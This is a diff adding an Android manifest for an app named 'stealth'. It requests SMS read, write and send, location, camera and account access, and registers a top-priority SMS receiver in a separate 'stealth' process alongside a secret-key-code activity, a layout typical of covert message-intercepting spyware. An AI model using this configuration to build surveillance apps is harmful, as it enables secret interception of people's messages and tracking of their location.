@@ -1,0 +1,65 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="cacafogo.software.stealth"
+    android:versionCode="1"
+    android:versionName="1.0" >
+
+    <uses-sdk android:minSdkVersion="7" />
+    
+    
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+	<uses-permission android:name="android.permission.READ_SMS" />
+	<uses-permission android:name="android.permission.RECEIVE_SMS" />
+	<uses-permission android:name="android.permission.INTERNET" /> 
+	<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /> 
+	<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /> 
+	<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" /> 
+	<uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS" /> 
+	<uses-permission android:name="android.permission.ACCESS_MOCK_LOCATION" /> 
+	<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /> 
+	<uses-permission android:name="android.permission.CONTROL_LOCATION_UPDATES" /> 
+	<uses-permission android:name="android.permission.SEND_SMS" /> 
+	<uses-permission android:name="android.permission.CAMERA" /> 
+	<uses-permission android:name="android.permission.CHANGE_WIFI_STATE" /> 
+	<uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" /> 
+	<uses-permission android:name="android.permission.GET_ACCOUNTS" /> 
+	
+	
+    <application
+        android:name=".ApplicationStuff" 
+        android:icon="@drawable/ic_launcher"
+        android:label="@string/app_name" >
+        
+        <activity
+            android:name=".StealthActivity"
+            android:label="@string/app_name" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <activity android:name=".secret_key_code.SecretKeyCodeActivatedActivity"/>
+        
+        <receiver 
+            android:name=".broadcast_receiver.SmsReceiver" 
+            android:enabled="true"
+            android:exported="true"
+            android:process=":stealth">
+            
+            <intent-filter android:priority="999">
+					<action android:name="android.provider.Telephony.SMS_RECEIVED" />
+			</intent-filter>
+			
+        </receiver>
+         <receiver 
+            android:name=".broadcast_receiver.SmsSent" 
+            android:enabled="true"
+            android:exported="true"
+            android:process=":stealthSmsSent">
+        </receiver>
+       
+        
+    </application>
+
+</manifest>
